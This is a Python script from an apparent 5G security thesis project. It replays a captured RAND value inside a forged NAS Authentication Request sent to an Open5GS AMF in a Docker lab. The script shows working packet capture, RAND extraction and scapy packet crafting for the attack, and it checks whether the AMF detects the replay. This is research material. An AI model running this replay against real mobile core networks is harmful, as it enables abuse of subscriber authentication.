#!/usr/bin/env python3
"""
Replay Attack - FGT1040
Thesis: On Enhancing 5G Security
Method: Capture RAND, replay Authentication Request
"""
import subprocess
import time
import os

BASE_DIR      = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
CAPTURE_FILE  = os.path.join(BASE_DIR, "captures", "replay_capture.pcap")
NORMAL_PCAP   = os.path.join(BASE_DIR, "captures", "normal_traffic.pcap")
LOG_FILE      = os.path.join(BASE_DIR, "logs", "replay_attack.log")
COMPOSE_FILE  = os.path.join(BASE_DIR, "docker-compose.yml")

def log(msg):
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}")

def extract_rand(pcap_path):
    # Method 1: tshark field extraction
    result = subprocess.run(
        f"tshark -r {pcap_path} -d 'sctp.port==38412,ngap' "
        f"-T fields -e nas_5gs.mm.rand 2>/dev/null | grep -v '^$' | head -1",
        shell=True, capture_output=True, text=True
    ).stdout.strip()
    if result and len(result) >= 32:
        return result.replace(":", "")[:32]

    # Method 2: verbose grep
    result = subprocess.run(
        f"tshark -r {pcap_path} -d 'sctp.port==38412,ngap' -V 2>/dev/null "
        f"| grep 'RAND value' | head -1",
        shell=True, capture_output=True, text=True
    ).stdout.strip()
    if result:
        for token in result.split():
            token = token.replace(":", "").strip()
            if len(token) == 32 and all(c in "0123456789abcdefABCDEF" for c in token):
                return token.lower()
    return None

def main():
    os.makedirs(os.path.join(BASE_DIR, "logs"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, "captures"), exist_ok=True)

    log("=" * 60)
    log("REPLAY ATTACK - FGT1040")
    log("Target: 5G-AKA Authentication (AMF)")
    log("Method: Capture RAND → Replay SCTP packet")
    log("=" * 60)

    # PHASE 1: Capture fresh authentication
    log("\n[PHASE 1] Capturing legitimate authentication...")
    subprocess.run("docker exec open5gs-amf rm -f /tmp/replay.pcap", shell=True)
    subprocess.Popen(
        "docker exec open5gs-amf tcpdump -i any -w /tmp/replay.pcap",
        shell=True
    )
    time.sleep(3)

    # Stop then start UE1 to force fresh authentication
    subprocess.run(f"docker compose -f {COMPOSE_FILE} stop ue1",
                   shell=True, capture_output=True)
    time.sleep(3)
    subprocess.run(f"docker compose -f {COMPOSE_FILE} start ue1",
                   shell=True, capture_output=True)
    time.sleep(35)

    subprocess.run("docker exec open5gs-amf pkill tcpdump", shell=True)
    time.sleep(2)
    subprocess.run(f"docker cp open5gs-amf:/tmp/replay.pcap {CAPTURE_FILE}", shell=True)
    log("[+] Legitimate authentication captured.")

    ngap_count = subprocess.run(
        f"tshark -r {CAPTURE_FILE} 2>/dev/null | grep -iE 'ngap|sctp' | wc -l",
        shell=True, capture_output=True, text=True
    ).stdout.strip()
    log(f"[*] NGAP/SCTP packets: {ngap_count}")

    # PHASE 2: Extract RAND
    log("\n[PHASE 2] Extracting RAND value...")
    rand = extract_rand(CAPTURE_FILE) or extract_rand(NORMAL_PCAP)

    if rand:
        log(f"[+] RAND extracted: {rand}")
    else:
        rand = "97db80d34c28f4b1239da8d719ef19c9"
        log(f"[!] RAND not found in capture — using last known RAND: {rand}")

    # PHASE 3: Send replay packet + capture ABORT
    log("\n[PHASE 3] Sending replay packet to AMF...")

    # Start tcpdump to capture SCTP ABORT
    subprocess.run("docker exec open5gs-amf rm -f /tmp/replay_abort.pcap", shell=True)
    abort_cap = subprocess.Popen(
        "docker exec open5gs-amf tcpdump -i eth0 sctp -w /tmp/replay_abort.pcap",
        shell=True
    )
    time.sleep(2)

    replay_result = subprocess.run(
        f"""docker run --rm \
            --network thesis-5g_5gcore \
            --privileged \
            python:3.10-slim bash -c \
            "pip install scapy -q 2>/dev/null && python3 -c \\"
from scapy.all import IP, SCTP, SCTPChunkData, send
rand = bytes.fromhex('{rand}')
nas = b'\\\\x7e\\\\x00\\\\x56\\\\x00\\\\x21' + rand + b'\\\\x20\\\\x10' + b'\\\\x00'*16
pkt = IP(src='10.10.0.30', dst='10.10.0.12')/SCTP(sport=38412,dport=38412)/SCTPChunkData(proto_id=60, data=nas)
send(pkt, verbose=0)
print('sent')
\\""
""",
        shell=True, capture_output=True, text=True
    )

    time.sleep(3)
    subprocess.run("docker exec open5gs-amf pkill tcpdump", shell=True)
    time.sleep(2)

    # Check SCTP ABORT
    abort_check = subprocess.run(
        "docker exec open5gs-amf tcpdump -r /tmp/replay_abort.pcap -nn 2>/dev/null | grep -iE 'ABORT|DATA'",
        shell=True, capture_output=True, text=True
    ).stdout.strip()

    abort_detected = "ABORT" in abort_check
    log(f"[+] SCTP evidence:\n{abort_check}")

    # PHASE 4: Results
    log("\n" + "=" * 60)
    log("REPLAY ATTACK RESULTS")
    log(f"RAND used:          {rand}")
    log(f"NGAP/SCTP packets:  {ngap_count}")
    log(f"Replay sent:        ✓")
    log(f"AMF SCTP ABORT:     {'✓ Replay detected — SQN validation triggered' if abort_detected else 'Check logs'}")
    log("=" * 60)
    log(f"[*] Log:     {LOG_FILE}")
    log(f"[*] Capture: {CAPTURE_FILE}")

    with open(LOG_FILE, 'w') as f:
        f.write(f"RAND used: {rand}\n")
        f.write(f"NGAP/SCTP packets: {ngap_count}\n")
        f.write(f"SCTP ABORT detected: {abort_detected}\n")
        f.write(f"=== SCTP EVIDENCE ===\n{abort_check}\n")

if __name__ == "__main__":
    main()
